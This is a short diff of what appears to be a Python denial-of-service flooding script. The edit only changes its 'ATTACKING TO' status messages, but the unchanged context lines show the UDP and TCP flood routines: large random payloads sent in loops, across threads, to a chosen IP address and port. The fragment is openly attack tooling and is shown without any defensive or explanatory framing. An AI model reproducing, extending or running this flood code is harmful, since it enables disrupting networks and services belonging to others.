@@ -30,9 +30,9 @@ def udp():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(f"ZIEL ATTACKING TO {ip} : {port}")
+			print(f"ZIELX ATTACKING TO {ip} : {port}")
 		except:
-			print(f"attack {ip} port {port}")
+			print(f"ZIELX ATTACKING TO {ip} : {port}")
 
 def tcp():
 	data = random._urandom(102498)
@@ -43,10 +43,10 @@ def tcp():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(f"ZIEL ATTACKING TO {ip} : {port}")
+			print(f"ZIELX ATTACKING TO {ip} : {port}")
 		except:
 			s.close()
-			print(f"ZIEL ATTACKING TO {ip} : {port}")
+			print(f"ZIELX ATTACKING TO {ip} : {port}")
 
 
 for y in range(threads):
